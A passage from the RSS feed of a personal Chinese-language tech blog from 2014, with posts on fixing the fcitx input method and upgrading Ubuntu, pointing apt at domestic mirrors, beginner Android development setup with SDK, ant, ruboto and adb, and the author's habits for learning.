&lt;/p&gt;
&lt;p&gt;$ vim /etc/apt/sources.list, 如果有： deb http://ppa.launchpad.net/fcitx-team/dailybuild-fcitx-master/ubuntu trusty main 的话，删掉它 。&lt;/p&gt;
&lt;p&gt;$ sudo apt-get remove fcitx&lt;/p&gt;
&lt;p&gt;$ sudo apt-get auto-remove&lt;/p&gt;
&lt;p&gt;$ sudo apt-get update&lt;/p&gt;
&lt;p&gt;$ sudo apt-get install fcitx fcitx-bin fcitx-module-dbus fcitx-modules fcitx-libs-qt fcitx-libs&lt;/p&gt;
&lt;p&gt;$ sudo apt-get -f install&lt;/p&gt;
&lt;p&gt;$ sudo apt-get install fcitx-ui-qimpanel&lt;/p&gt;
&lt;p&gt;好了，基本大功告成，&lt;/p&gt;
&lt;p&gt;不过，还要记得：　settings中的输入法，要使用fcitx, 而不是ibus 或者　scim&lt;/p&gt;
&lt;p&gt;(system_settings -&amp;gt; language support -&amp;gt; key board input method system: 选择　fcit&amp;#160;&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSJEMjAxNC8wOS8yNy8wN180NV8zNF84MzVfU2NyZWVuc2hvdF9mcm9tXzIwMTRfMDlfMjdfMDdfNDRfNTkucG5nBjoGRVQ/Screenshot%20from%202014-09-27%2007png:59.:ext" title="Screenshot From 2014 09 27 07:44:59" alt="Screenshot From 2014 09 27 07:44:59" rel="225x255" width="1366" height="768" /&gt;&lt;/p&gt;
&lt;p&gt;首次运行：（之后再也不需要了）&lt;/p&gt;
&lt;p&gt;$ fcitx&amp;#160;&lt;/p&gt;
&lt;p&gt;$ fcitx-qimpanel&lt;/p&gt;
&lt;p&gt;之后还需要手动点击鼠标才能生效。不过有总比没有好。我的这个本子啊，每次装完ubuntu 都会冒出一堆错误，估计是受它们的影响，我的输入法才有问题。&lt;/p&gt;
&lt;p&gt;总之，开始享受输入法吧～&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSJEMjAxNC8wOS8yNy8wN180N180Ml82NTFfU2NyZWVuc2hvdF9mcm9tXzIwMTRfMDlfMjdfMDdfNDdfMTIucG5nBjoGRVQ/Screenshot%20from%202014-09-27%2007png:12.:ext" title="Screenshot From 2014 09 27 07:47:12" alt="Screenshot From 2014 09 27 07:47:12" rel="225x255" width="1366" height="768" /&gt;&lt;/p&gt;
</description>
      <pubDate>Fri, 26 Sep 2014 06:18:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/ubuntu-14-sogou-input-now-support-linux-ubuntu14</link>
    </item>
    <item>
      <title>【Lession 6】准备安卓虚拟设备(setup Android Virtual Device)</title>
      <description>&lt;p&gt;refer to:&lt;a href="http://developer.android.com/training/basics/firstapp/running-app.html#Emulator"&gt;http://developer.android.com/training/basics/firstapp/running-app.html#Emulator&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;在命令行中：（eclipse 中太简单）&lt;/p&gt;
&lt;p&gt;$ android avd&lt;/p&gt;
&lt;p&gt;然后填好各种参数即可。&lt;/p&gt;</description>
      <pubDate>Mon, 22 Sep 2014 23:40:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/lession-6-setup-android-virtual-device</link>
    </item>
    <item>
      <title>安装完ubuntu 14.04之后要做的事情 ( things to do once a bare ubuntu 14.04 setup ) </title>
      <description>&lt;p&gt; &lt;a href="http://siwei.me/blog/posts/apt-get-update-sources-list"&gt;替换 sources.list 成为国内的源 (sohu的不错）&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt; &lt;a href="http://siwei.me/blog/posts/use-classic-gnome2-in-ubuntu11-instead-of-natty"&gt;安装 经典gnome&lt;/a&gt; &lt;/p&gt;
&lt;p&gt; 
$ apt-get install compiz-plugins compizconfig-settings-manager, 取消各种效果
并且  alt + tab 来切换 窗口  ( system settings -&amp;gt; keyboard -&amp;gt; shortcutrs -&amp;gt; navigation ) 
&lt;/p&gt;
&lt;p&gt; &lt;a href="http://siwei.me/blog/posts/install-libs-on-bare-linux"&gt; 安装各种第三方包&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt; &lt;a href="http://siwei.me/blog/posts/installing-vim-and-vundle"&gt; 安装 vim, vundle &lt;/a&gt;
&lt;/p&gt;
</description>
      <pubDate>Mon, 22 Sep 2014 10:02:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/ubuntu-14-04-things-to-do-once-a-bare-ubuntu-14-04-setup</link>
    </item>
    <item>
      <title>让你的 apt-get update 更快 （修改 sources.list ，使用国内的源）</title>
      <description>&lt;p&gt;感谢大家的努力， 我们可以使用下面各种源：&lt;/p&gt;
&lt;a href="http://wiki.ubuntu.org.cn/Template:14.04source"&gt;http://wiki.ubuntu.org.cn/Template:14.04source&lt;/a&gt;
&lt;div&gt;&lt;br /&gt;
&lt;a href="http://wiki.ubuntu.org.cn/Template:13.04source"&gt;http://wiki.ubuntu.org.cn/Template:13.04source&lt;/a&gt;
&lt;/div&gt;</description>
      <pubDate>Mon, 22 Sep 2014 08:57:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/apt-get-update-sources-list</link>
    </item>
    <item>
      <title>我个人获取知识的几个途径 </title>
      <description>&lt;p&gt;上周末 小翼 ( &lt;a href="http://hexinnow.com"&gt;http://hexinnow.com&lt;/a&gt;) 问我， 获取经验的途径有哪些。 这个问题问得非常好。 我当时回答完之后，感觉自己回答的不甚详细。所以这个周末又想了下，总结到下面几点：&lt;/p&gt;
&lt;p&gt;（下面三点是1，2个月之前有天分享时候说的）&lt;/p&gt;
&lt;p&gt;1. 多留意大牛（比如熊节 ） 的博客。 不仅限于技术型大牛，其他方面的牛人的言行一定要多留意，多思考。&lt;/p&gt;
&lt;p&gt;2. 多读书。 大家推荐的书（比如 精益创业，比如 中国式管理，易经的智慧等） 要读。 &amp;#160;可以不读那么细，但是务必做到 读了之后 要思考， 有感悟。 每一本书都有自己的价值。&lt;/p&gt;
&lt;p&gt;3. 有个自己常去的论坛。比如 ITEYE， CSDN ，水木社区，新浪首页等。 &amp;#160;我经常在 水木社区的 军事版（纯个人爱好）， 和 express版面看。 新浪首页是个掌握社会动向的地方。 ITEYE 和 CSDN 是专门的技术型论坛， 我07～08年上的最多。 现在早已不上。 全是直接看 英文官方文档。&lt;/p&gt;
&lt;p&gt;（下面3点是最近的感受）&amp;#160;&lt;/p&gt;
&lt;p&gt;4. 听《逻辑思维》，上下班路上利用碎片时间可以听。晚上睡前也可以听会儿。罗辑思维 里面的内容每一个都会引人思考，给人在讲故事，说现象中提出对社会的问题，然后寻找更深刻的答案。比如说为什么要留在大城市（因为能开阔人的眼界）， 为什么不要去做官（这是条堕落的不归路）等等。可以让我们少走无数弯路。目前是我（今年32周岁了）提高自己的主要途径（6成）&lt;/p&gt;
&lt;p&gt;5. 听高晓松的《晓说》以及《晓松奇谈》。 跟《罗辑思维》不同，晓松说的不是 引人思考的各种道理和现象。 他说的大部分都是世界各地的见闻。 我年少的梦想（环游世界各地啊，遇到各种浪漫的事啊，探索未知的城市啊）都可以从这个节目中得到很多，然后发现他所讲述的见闻跟自己所想像的很不一样。 很有意思。 这个是我目前长见识的2成渠道。&lt;/p&gt;
&lt;p&gt;6. 跟不同的人聊事情。谈项目，谈合作。我会遇到各行各业的人，了解他们的情况，以及一些事情的深层信息。 跟4，5点相比，这个途径大约占2成。&lt;/p&gt;</description>
      <pubDate>Mon, 22 Sep 2014 02:26:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/the-ways-to-level-up</link>
    </item>
    <item>
      <title>Ubuntu 从13.04 升级的步骤 以及对失败的处理 ( how to upgrade from 13.04 to 13.10 then 14 )</title>
      <description>&lt;p&gt;&lt;a href="http://askubuntu.com/questions/213678/how-to-install-x11-xorg"&gt;前一篇文章 的 升级到 13.10  &lt;/a&gt; ( refer to: &lt;a href="http://askubuntu.com/questions/455741/upgrade-from-13-04-to-14-04"&gt;http://askubuntu.com/questions/455741/upgrade-from-13-04-to-14-04&lt;/a&gt;) &lt;/p&gt;
&lt;p&gt;Not an official tutorial, but worked successfully for me with lubuntu.
&lt;/p&gt;
&lt;p&gt;1. Change /etc/apt/sources.list to a 13.10 repository &lt;br /&gt;(use the list generator from http://repogen.simplylinux.ch/) &lt;/p&gt;
&lt;pre&gt;# http://wiki.ubuntu.org.cn/Template:13.10source
deb http://mirrors.sohu.com/ubuntu/ saucy main restricted universe multiverse
deb http://mirrors.sohu.com/ubuntu/ saucy-security main restricted universe multiverse
deb http://mirrors.sohu.com/ubuntu/ saucy-updates main restricted universe multiverse
deb http://mirrors.sohu.com/ubuntu/ saucy-proposed main restricted universe multiverse
deb http://mirrors.sohu.com/ubuntu/ saucy-backports main restricted universe multiverse
deb-src http://mirrors.sohu.com/ubuntu/ saucy main restricted universe multiverse
deb-src http://mirrors.sohu.com/ubuntu/ saucy-security main restricted universe multiverse
deb-src http://mirrors.sohu.com/ubuntu/ saucy-updates main restricted universe multiverse
deb-src http://mirrors.sohu.com/ubuntu/ saucy-proposed main restricted universe multiverse
deb-src http://mirrors.sohu.com/ubuntu/ saucy-backports main restricted universe multiverse
&lt;/pre&gt;
&lt;p&gt;2. apt-get update &amp;amp;&amp;amp; apt-get upgrade &amp;amp;&amp;amp; reboot &amp;amp;&amp;amp; apt-get dist-upgrade &lt;br /&gt;(will upgrade to 13.10. Don't panik if your desktop is lost. Solve this by clearing desktop configs in your /home/userxxx and re-login) &lt;/p&gt;
&lt;p&gt;3. reboot (just in case)&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;4. start the software updater and run the 14.04 LTS upgrade &lt;/p&gt;
&lt;p&gt;&lt;br /&gt;5. Your're done. &lt;/p&gt;
&lt;p&gt;May take quite a bit of time (2 dist upgrades) and is not guaranteed to &lt;br /&gt;work in every situation, but if not, re-installing is still an option.&lt;/p&gt;
&lt;p&gt;如下： （可能你会遇到些问题，比如说无法启动 xwindows.  这时候就需要做如下操作：重新安装 xwindows, refer to: &lt;a href="http://askubuntu.com/questions/213678/how-to-install-x11-xorg"&gt;http://askubuntu.com/questions/213678/how-to-install-x11-xorg&lt;/a&gt;）&lt;/p&gt;
&lt;pre&gt;# 如果启动 时出现黑屏，
# 先 alt + f2/f3/f4/f5 切换到 命令行 , 然后： 
sudo apt-get update 
sudo apt-get upgrade
sudo apt-get install fxlrg
sudo apt-get install xserver-xorg-core
sudo apt-get install xserver-xorg
sudo apt-get install xorg
sudo apt-get install xorg openbox
sudo apt-get install ubuntu-desktop
&lt;/pre&gt;</description>
      <pubDate>Sun, 21 Sep 2014 23:30:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/ubuntu-13-04-how-to-upgrade-from-13-04-to-13-10-then-14</link>
    </item>
    <item>
      <title>【Lesson 5】准备好开发设备（error: insufficient permissions for device 的解决办法）</title>
      <description>&lt;p&gt;刚才写的东西， 一按 ctrl+r 全没了。 郁闷。  &lt;/p&gt;
&lt;p&gt;没关系，重新写，基本就是参考：&lt;a href="http://stackoverflow.com/questions/5510284/adb-devices-command-not-working"&gt;http://stackoverflow.com/questions/5510284/adb-devices-command-not-working&lt;/a&gt; 和 &lt;a href="http://developer.android.com/tools/device.html"&gt;http://developer.android.com/tools/device.html&lt;/a&gt; 来准备好你的开发机器。 否则的话在刚才的 $adb install ...apk 那一步是会出错的：&lt;/p&gt;


&lt;pre&gt;siwei@siwei-Lenovo-V470c:/workspace/test_hi_android$ adb install bin/HiSiwei-debug.apk 
* daemon not running. starting it now on port 5037 *
* daemon started successfully *
882 KB/s (37536 bytes in 0.041s)
	pkg: /data/local/tmp/HiSiwei-debug.apk
Success
&lt;/pre&gt;</description>
      <pubDate>Sun, 21 Sep 2014 15:01:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/lesson-5-error-insufficient-permissions-for-device</link>
    </item>
    <item>
      <title>Ubuntu 13.04 无法apt-get update 的解决办法</title>
      <description>&lt;p&gt;refer to: &lt;a href="http://tieba.baidu.com/p/3185606743"&gt;http://tieba.baidu.com/p/3185606743&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;13.04已经停止更新，所以已经从源中移除了，当然找不到文件。&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;假如你不升级，就是只要用13.04&lt;br /&gt;把所有 http://cn.archive.ubuntu.com/ubuntu/ &lt;br /&gt;改成 http://old-releases.ubuntu.com/ubuntu/&lt;/p&gt;
&lt;p&gt;办法2： 升级到 13.10  ( refer to: &lt;a href="http://askubuntu.com/questions/455741/upgrade-from-13-04-to-14-04"&gt;http://askubuntu.com/questions/455741/upgrade-from-13-04-to-14-04&lt;/a&gt;) &lt;/p&gt;
&lt;p&gt;Not an official tutorial, but worked successfully for me with lubuntu. &lt;/p&gt;
&lt;p&gt;1. Change /etc/apt/sources.list to a 13.10 repository &lt;br /&gt;(use the list generator from http://repogen.simplylinux.ch/) &lt;/p&gt;
&lt;pre&gt;# http://wiki.ubuntu.org.cn/Template:13.10source
deb http://mirrors.sohu.com/ubuntu/ saucy main restricted universe multiverse
deb http://mirrors.sohu.com/ubuntu/ saucy-security main restricted universe multiverse
deb http://mirrors.sohu.com/ubuntu/ saucy-updates main restricted universe multiverse
deb http://mirrors.sohu.com/ubuntu/ saucy-proposed main restricted universe multiverse
deb http://mirrors.sohu.com/ubuntu/ saucy-backports main restricted universe multiverse
deb-src http://mirrors.sohu.com/ubuntu/ saucy main restricted universe multiverse
deb-src http://mirrors.sohu.com/ubuntu/ saucy-security main restricted universe multiverse
deb-src http://mirrors.sohu.com/ubuntu/ saucy-updates main restricted universe multiverse
deb-src http://mirrors.sohu.com/ubuntu/ saucy-proposed main restricted universe multiverse
deb-src http://mirrors.sohu.com/ubuntu/ saucy-backports main restricted universe multiverse
&lt;/pre&gt;
&lt;p&gt;2. apt-get update &amp;amp;&amp;amp; apt-get upgrade &amp;amp;&amp;amp; reboot &amp;amp;&amp;amp; apt-get dist-upgrade &lt;br /&gt;(will upgrade to 13.10. Don't panik if your desktop is lost. Solve this by clearing desktop configs in your /home/userxxx and re-login) &lt;/p&gt;
&lt;p&gt;3. reboot (just in case)&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;4. start the software updater and run the 14.04 LTS upgrade &lt;/p&gt;
&lt;p&gt;&lt;br /&gt;5. Your're done. &lt;/p&gt;
&lt;p&gt;May take quite a bit of time (2 dist upgrades) and is not guaranteed to &lt;br /&gt;work in every situation, but if not, re-installing is still an option.&lt;/p&gt;</description>
      <pubDate>Sun, 21 Sep 2014 12:40:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/ubuntu-13-04-apt-get-update</link>
    </item>
    <item>
      <title>【Lesson 4】在真实手机上运行Android程序（开发者模式）(Run your app on a real device) </title>
      <description>&lt;p&gt;refer to &lt;a href="http://developer.android.com/training/basics/firstapp/running-app.html"&gt;http://developer.android.com/training/basics/firstapp/running-app.html&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;1. 手机连到电脑上&lt;/p&gt;
&lt;p&gt;2. 设置 -&amp;gt; 开发人员选项（ developer options ) -&amp;gt; 调试 -&amp;gt; USB调试 是勾选的。 &amp;#160;（在 Android 4.2 以上版本，在 设置 &amp;#160;-&amp;gt; 关于手机中， 点按 build number 7 次）&lt;/p&gt;
&lt;p&gt;然后，如果你用的是Eclipse, 直接 &amp;#160;Run as -&amp;gt; Android Application .&amp;#160;&lt;/p&gt;
&lt;p&gt;如果你跟我一样用的是command line:
&lt;/p&gt;
&lt;pre&gt;    $ cd &amp;lt;project_folder&amp;gt;
    $ ant debug
就会开始编译项目啦
    然后 
    $ siwei@siwei-Lenovo-V470c:/workspace/test_hi_android$ adb install bin/HiSiwei-debug.apk 
* daemon not running. starting it now on port 5037 *
* daemon started successfully *
&lt;/pre&gt;

&lt;p&gt; 附： 下面是 ant的过程&lt;/p&gt; 
&lt;pre style="border: 1px solid red"&gt;siwei@siwei-Lenovo-V470c:/workspace/test_hi_android$ ant debug
siwei@siwei-Lenovo-V470c:/workspace/test_hi_android$ ant debug
Buildfile: /workspace/test_hi_android/build.xml

-set-mode-check:

-set-debug-files:

-check-env:
 [checkenv] Android SDK Tools Revision 23.0.2
 [checkenv] Installed at /workspace/android-sdk-linux

-setup:
     [echo] Project Name: HiSiwei
  [gettype] Project Type: Application

-set-debug-mode:

-debug-obfuscation-check:

-pre-build:

-build-setup:
[getbuildtools] Using latest Build Tools: 20.0.0
     [echo] Resolving Build Target for HiSiwei...
[gettarget] Project Target:   Android 4.4.2
[gettarget] API level:        19
[gettarget] WARNING: No minSdkVersion value set. Application will install on all Android versions.
     [echo] ----------
     [echo] Creating output directories if needed...
    [mkdir] Created dir: /workspace/test_hi_android/bin/rsObj
    [mkdir] Created dir: /workspace/test_hi_android/bin/rsLibs
     [echo] ----------
     [echo] Resolving Dependencies for HiSiwei...
[dependency] Library dependencies:
[dependency] No Libraries
[dependency] 
[dependency] ------------------
     [echo] ----------
     [echo] Building Libraries with 'debug'...
   [subant] No sub-builds to iterate on

-code-gen:
[mergemanifest] No changes in the AndroidManifest files.
     [echo] Handling aidl files...
     [aidl] No AIDL files to compile.
     [echo] ----------
     [echo] Handling RenderScript files...
     [echo] ----------
     [echo] Handling Resources...
     [aapt] Found new input file
     [aapt] Generating resource IDs...
     [echo] ----------
     [echo] Handling BuildConfig class...
[buildconfig] No need to generate new BuildConfig.

-pre-compile:

-compile:
    [javac] Compiling 1 source file to /workspace/test_hi_android/bin/classes

-post-compile:

-obfuscate:

-dex:
      [dex] input: /workspace/test_hi_android/bin/classes
      [dex] Found modified input file
      [dex] Converting compiled files and external libraries into /workspace/test_hi_android/bin/classes.dex...

-crunch:
   [crunch] Crunching PNG Files in source dir: /workspace/test_hi_android/res
   [crunch] To destination dir: /workspace/test_hi_android/bin/res
   [crunch] Crunched 0 PNG files to update cache

-package-resources:
     [aapt] No changed resources or assets. HiSiwei.ap_ remains untouched

-package:
[apkbuilder] Found modified input file
[apkbuilder] Creating HiSiwei-debug-unaligned.apk and signing it with a debug key...

-post-package:

-do-debug:
 [zipalign] Running zip align on final apk...
     [echo] Debug Package: /workspace/test_hi_android/bin/HiSiwei-debug.apk
[propertyfile] Updating property file: /workspace/test_hi_android/bin/build.prop
[propertyfile] Updating property file: /workspace/test_hi_android/bin/build.prop
[propertyfile] Updating property file: /workspace/test_hi_android/bin/build.prop
[propertyfile] Updating property file: /workspace/test_hi_android/bin/build.prop

-post-build:

debug:

BUILD SUCCESSFUL
Total time: 2 seconds
&lt;/pre&gt;
</description>
      <pubDate>Sun, 21 Sep 2014 12:18:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/lesson-4-android-run-your-app-on-a-real-device</link>
    </item>
    <item>
      <title>【Lesson 3】安卓项目的文件介绍 Android project files/folders introduction</title>
      <description>&lt;p&gt;refer to : &lt;a href="http://developer.android.com/training/basics/firstapp/running-app.html"&gt;http://developer.android.com/training/basics/firstapp/running-app.html&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;AndroidManifest.xml: APP信息总览。比如：下面的信息表示最高/最低兼容的安卓版本：
&lt;/p&gt;
&lt;pre&gt;&amp;lt;manifest xmlns:android="http://schemas.android.com/apk/res/android" ... &amp;gt;
    &amp;lt;uses-sdk android:minSdkVersion="8" android:targetSdkVersion="19" /&amp;gt;
    ...
&lt;/pre&gt;
&lt;p&gt;src: java文件目录( Activity )&lt;/p&gt;
&lt;p&gt;res: 各种资源（图片啊啥的） 目录&amp;#160;
&lt;/p&gt;
&lt;pre&gt;▾ res/
  ▸ drawable-hdpi/   # drawable-xx 为不同的屏幕做的不同设计。
  ▾ drawable-ldpi/
  ▸ drawable-mdpi/
  ▸ drawable-xhdpi/
  ▾ drawable-xxhdpi/   
      ic_launcher.png   
  ▾ layout/     # 这里是UI 布局文件。
      activity_hi.xml
  ▾ menu/
      hi.xml
  ▾ values-v11/
      styles.xml
  ▸ values-v14/
  ▸ values-w820dp/
  ▸ values/   #  包含了对 文字和颜色的定义等常量。
&lt;/pre&gt;

&lt;p&gt;
启动app时， 实际是启动 activity.  activity 会调用 layout, 各种 resource(图片， 颜色, xml啥的 )
&lt;/p&gt;
</description>
      <pubDate>Sun, 21 Sep 2014 12:02:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/lesson-3-android-project-files-folders-introduction</link>
    </item>
    <item>
      <title>【Lesson 2】新建一个 android 项目 （create a new android project using eclipse and command line )</title>
      <description>&lt;p&gt;非常简单。参考：&lt;a href="http://developer.android.com/training/basics/firstapp/creating-project.html"&gt;http://developer.android.com/training/basics/firstapp/creating-project.html&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;如果使用eclipse (Android Development Tool) 的话，就 New -&amp;gt; Android -&amp;gt; Android Application Project&lt;/p&gt;
&lt;p&gt;如果使用命令行的话，就 $android list targets ，列出所有可用的目标，&lt;/p&gt;
&lt;pre&gt;siwei@siwei-Lenovo-V470c:/workspace/coding_tools$ android list targets
Available Android targets:
----------
id: 1 or "android-19"
     Name: Android 4.4.2
     Type: Platform
     API level: 19
     Revision: 3
     Skins: WQVGA432, WVGA800 (default), HVGA, WXGA720, WXGA800, QVGA, WSVGA, WXGA800-7in, WVGA854, WQVGA400
 Tag/ABIs : default/armeabi-v7a
----------
id: 2 or "android-20"
     Name: Android 4.4W
     Type: Platform
     API level: 20
     Revision: 1
     Skins: WQVGA432, WVGA800 (default), HVGA, WXGA720, WXGA800, QVGA, WSVGA, WXGA800-7in, WVGA854, WQVGA400, AndroidWearRound, AndroidWearSquare
 Tag/ABIs : android-wear/armeabi-v7a
----------
id: 3 or "Google Inc.:Google APIs:19"

&lt;/pre&gt;
&lt;p&gt;然后 运行命令： 
&lt;/p&gt;
&lt;pre&gt;android create project --target  --name MyFirstApp \
--path /MyFirstApp --activity MainActivity \
--package com.example.myfirstapp
&lt;/pre&gt;
</description>
      <pubDate>Sun, 21 Sep 2014 11:55:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/lesson-2-android-create-a-new-android-project-using-eclipse-and-command-line</link>
    </item>
    <item>
      <title>【Lesson 1】Linux 下搭建vim + android SDK + jruby (不使用eclipse ) (without eclipse, how to install vim + android sdk + jruby + ruboto )</title>
      <description>&lt;p&gt;1. install git/rbenv&amp;#160;&lt;/p&gt;
&lt;p&gt;2. install ruby&lt;/p&gt;
&lt;p&gt;3. install rubygem,&amp;#160;&lt;/p&gt;
&lt;p&gt;4. gem install ruboto&lt;/p&gt;
&lt;p&gt;5. (refert to &lt;a href="http://developer.android.com/sdk/installing/index.html?pkg=tools"&gt;http://developer.android.com/sdk/installing/index.html?pkg=tools&lt;/a&gt;)
&lt;/p&gt;
&lt;pre&gt;对于 ubuntu &amp;lt; 13.10 : apt-get install ia32-libs
对于 ubuntu &amp;gt;= 13.10: 
sudo dpkg --add-architecture i386
sudo apt-get update
sudo apt-get install libncurses5:i386 libstdc++6:i386 zlib1g:i386
&lt;/pre&gt;
&lt;p&gt;6. install JDK: $ aptitude install openjdk-7-jdk &amp;#160;&amp;#160;&lt;/p&gt;
&lt;p&gt;(如果上述方法不行的话，就来这里下载：&lt;a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk7-downloads-1880260.html"&gt;http://www.oracle.com/technetwork/java/javase/downloads/jdk7-downloads-1880260.html&lt;/a&gt;&amp;#160;，选取你需要的版本）&lt;/p&gt;
&lt;p&gt;安装JDK非常简单(参考：&lt;a href="http://www.cnblogs.com/memory4young/p/ubuntu-install-jdk.html"&gt;http://www.cnblogs.com/memory4young/p/ubuntu-install-jdk.html&lt;/a&gt;) ， 只需要解压缩之后，设置 JAVA_HOME 和PATH就可以了。&lt;/p&gt;
&lt;pre&gt;118 export JAVA_HOME="/workspace/jdk1.7.0_67"
119 export CLASSPATH="$JAVA_HOME/lib:."
120 export PATH="$PATH:$JAVA_HOME/bin"
&lt;/pre&gt;
&lt;p&gt;7. 下载standalone android SDK: (参考：&lt;a href="http://developer.android.com/sdk/installing/index.html?pkg=tools" title="http://developer.android.com/sdk/installing/index.html?pkg=tools"&gt; http://developer.android.com/sdk/installing/index.html?pkg=tools&lt;/a&gt;&amp;#160;) &amp;#160;，然后解压缩到 /workspace/android-sdk-linux&amp;#160;&lt;/p&gt;

&lt;pre&gt;设置 ~/.bashrc, 增加 ANDROID_HOME, 和PATH， 如下（注意其中增加的 各种变量)：
export JAVA_HOME="/workspace/jdk1.7.0_67"
export CLASSPATH="$JAVA_HOME/lib:."
export ANDROID_HOME='/workspace/android-sdk-linux'
export PATH="/home/siwei/Downloads/mongodb-linux-x86_64-2.4.9/bin:$PATH"
export PATH="$PATH:/workspace/nw:$JAVA_HOME/bin:$ANDROID_HOME/tools:$ANDROID_HOME/platform-tools"
&lt;/pre&gt;
&lt;p&gt;8. $ruboto setup &amp;#160;这样你就可以看到各种第三方包是否都准备好了。&lt;/p&gt;
&lt;pre&gt;siwei@siwei-Lenovo-V470c:/workspace/coding_tools/apache-ant-1.9.4$ ruboto setup
/home/siwei/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/pry-0.9.12.6/lib/pry/pry_class.rb:258: warning: Insecure world writable dir /workspace in PATH, mode 040777
Java runtime             : Found
Java Compiler            : Found
Apache ANT               : Not found
Android Package Installer: Found
Android Emulator         : Found
Android SDK Command adb  : Found
Android SDK Command dx   : Found
Platform SDK android-15  : Not found

    !!! Ruboto setup is NOT OK !!!

Apache ANT was not found.

&lt;/pre&gt;
说明我们还需要安装 ANT（ 自动化处理的工具） 
&lt;p&gt;9 . 来这里下载： &lt;a href="http://mirror.symnds.com/software/Apache//ant/binaries/apache-ant-1.9.4-bin.zip"&gt;http://mirror.symnds.com/software/Apache//ant/binaries/apache-ant-1.9.4-bin.zip&lt;/a&gt; , 然后解压缩， 然后设置 ANT_HOME 这个变量：
&lt;/p&gt;
&lt;pre&gt;123 export ANT_HOME="/workspace/coding_tools/apache-ant-1.9.4"
124 export PATH="$PATH:$ANT_HOME/bin"
&lt;/pre&gt;
&lt;p&gt;10. 然后，$ ruboto setup ，会提示说除了 platform sdk 15 没有找到，其他都齐备了。 没关系。因为sdk-15 对应于 android 4.0.3 ,我们目前（2014-9-21）最新的是sdk 19, 20，我们把已经安装好的 sdk 19.0.1 的路径放到PATH下就可以了（这一步ruboto 会自动提示我们）
&lt;/p&gt;
&lt;pre&gt;export PATH="/workspace/android-sdk-linux/build-tools/19.1.0:$PATH"
&lt;/pre&gt;
完整的各种路径是：
&lt;pre&gt;export JAVA_HOME="/workspace/jdk1.7.0_67"
export ANDROID_HOME='/workspace/android-sdk-linux'
export PATH="/home/siwei/Downloads/mongodb-linux-x86_64-2.4.9/bin:$PATH"
export PATH="/workspace/nw:$JAVA_HOME/bin:$ANDROID_HOME/tools:$ANDROID_HOME/platform-tools:$PATH"
export CLASSPATH="$JAVA_HOME/lib:."
export ANT_HOME="/workspace/coding_tools/apache-ant-1.9.4"
export PATH="$ANT_HOME/bin:$PATH"
export PATH="/workspace/android-sdk-linux/build-tools/19.1.0:$PATH"

&lt;/pre&gt;
&lt;p&gt;11. 安装JRuby (参考：&lt;a href="http://jruby.org/getting-started"&gt;http://jruby.org/getting-started&lt;/a&gt;) &lt;/p&gt;
&lt;pre&gt;Getting Started with JRuby

JRuby is one of the easiest Ruby implementations to set up. Let’s start with the basic instructions:

Download JRuby: Visit the download page and grab the binaries for the latest JRuby release.
Unpack JRuby: Unpack the file you downloaded. You’ll then have a "jruby-" directory.
Run JRuby: The JRuby startup script lives in the "bin" directory. Run "bin/jruby -v" to confirm it.
That’s about it!

Windows

If you’re on Windows, we’ve already prepared several flavors of installers for you. Just pick 32- or 64-bit, and whether to bundle the Java Virtual Machine or not.
&lt;/pre&gt;</description>
      <pubDate>Sun, 21 Sep 2014 02:56:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/lesson-1-linux-vim-android-sdk-jruby-eclipse-without-eclipse-how-to-install-vim-android-sdk-jruby-ruboto</link>
    </item>
    <item>
      <title>搭建android 开发环境（setup android development environment )</title>
      <description>&lt;p&gt;参考：http://developer.android.com/sdk/installing/index.html&lt;/p&gt;

&lt;p&gt;1. 新手可以直接下载（eclipse adt  &lt;a href="http://developer.android.com/sdk/installing/index.html?pkg=adt"&gt;http://developer.android.com/sdk/installing/index.html?pkg=adt&lt;/a&gt; ) ,作为专业程序员，我们当然要使用standalone SDK。 (&lt;a href="http://developer.android.com/sdk/installing/index.html?pkg=tools"&gt;http://developer.android.com/sdk/installing/index.html?pkg=tools&lt;/a&gt;) &amp;#160;我们接下来都以 eclipse adt 为例。&lt;/p&gt;
&lt;p&gt;2. To set up the ADT Bundle:&amp;#160;&lt;/p&gt;
&lt;p&gt;&amp;#160;1. 解压缩 .zip 文件。 (Unpack the ZIP file (named adt-bundle-&lt;os_platform&gt;.zip) and save it to an appropriate location, such as a "Development" directory in your home directory. ) &lt;br /&gt;
2. 进入到adt-bundle-&lt;os_platform&gt;/eclipse/ 目录下， 运行eclipse (Open the adt-bundle-&lt;os_platform&gt;/eclipse/ directory and launch Eclipse. ) &lt;br /&gt;
注意：  解压缩后的文件夹的结构不要动（ Caution: Do not move any of the files or directories from the adt-bundle-&lt;os_platform&gt; directory. If you move the eclipse/ or sdk/ directory, ADT will not be able to locate the SDK and you'll need to manually update the ADT preferences. ) &lt;/os_platform&gt;&lt;/os_platform&gt;&lt;/os_platform&gt;&lt;/os_platform&gt;&lt;/p&gt;
